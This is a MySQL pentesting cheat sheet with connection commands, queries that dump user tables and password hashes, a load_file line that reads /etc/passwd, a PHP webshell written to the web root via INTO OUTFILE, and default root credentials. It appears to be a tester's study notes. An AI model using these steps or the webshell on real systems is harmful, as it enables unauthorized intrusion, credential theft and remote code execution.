# MySQL — Pentesting Reference

---

## Connecting

```bash
# Remote connection (from Kali)
mysql -u <user> -p'<password>' -h <target-ip>

# Remote — specify database directly
mysql -u <user> -p'<password>' -h <target-ip> <database>

# Local connection (from shell on target)
mysql -u <user> -p'<password>' <database>
```
→ If the remote connection gets `Host not allowed`, MySQL is locked to localhost only. You need a shell on the box first, then connect locally.

---

## Navigation

```sql
show databases;
```
→ Lists all databases on the server. Look for non-default names — anything that isn't `information_schema`, `mysql`, `performance_schema`, or `sys` is custom and worth digging into.

```sql
use <database>;
```
→ Switches into a database so your queries run against it.

```sql
show tables;
```
→ Lists all tables in the current database. `users`, `accounts`, `members`, `credentials` are the ones to hit first.

```sql
describe <table>;
```
→ Shows the column names and data types for a table. Use this before selecting to know what columns exist.

```sql
select * from <table>;
```
→ Dumps all rows and columns from a table. If the table is large, use `limit`: `select * from users limit 10;`

```sql
select username, password from users;
```
→ Selects specific columns only. Use this when `describe` shows you which columns hold credentials.

---

## What to Look For

Once inside a database, prioritize:

1. **Users table** — usernames and password hashes/encoded strings
2. **Config tables** — may store API keys, credentials, or paths
3. **Admin tables** — admin accounts often have reused passwords

Passwords in databases are commonly stored as:
- Plaintext (rare but happens)
- MD5 / SHA1 hashes → crack with hashcat or john
- Base64 encoded → `echo "<string>" | base64 -d`
- Double base64 → `echo "<string>" | base64 -d | base64 -d`
- bcrypt → harder to crack, try anyway

---

## MySQL User Enumeration

```sql
select user, host, authentication_string from mysql.user;
```
→ Dumps all MySQL user accounts and their password hashes. Requires access to the `mysql` system database — usually only available as root.

```sql
show grants for '<user>'@'localhost';
```
→ Shows what privileges a MySQL user has. `FILE` privilege is the dangerous one — see below.

---

## Reading Files (if FILE privilege exists)

```sql
select load_file('/etc/passwd');
```
→ Reads a file from the server's filesystem and returns it as a string. Only works if the MySQL user has `FILE` privilege and the file is world-readable. Alternative to LFI when you have a MySQL shell.

---

## Writing Files — Webshell Drop

```sql
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```
→ Writes a PHP webshell directly to the web root. If MySQL runs with write access to the web directory, this gives you RCE immediately. Visit `http://<target>/shell.php?cmd=id` to confirm execution.

→ **Requirements:** MySQL user needs `FILE` privilege, and the web root path must be writable by the MySQL process.

---

## Common Default Credentials

Try these if you find MySQL exposed with no credentials from enumeration:

| Username | Password |
|---|---|
| `root` | (blank) |
| `root` | `root` |
| `root` | `mysql` |
| `root` | `toor` |
| `admin` | `admin` |

---

## Related Notes

- [[Web_Enum]]
- [[Linux_Common_Commands]]
- [[File_Transfer]]
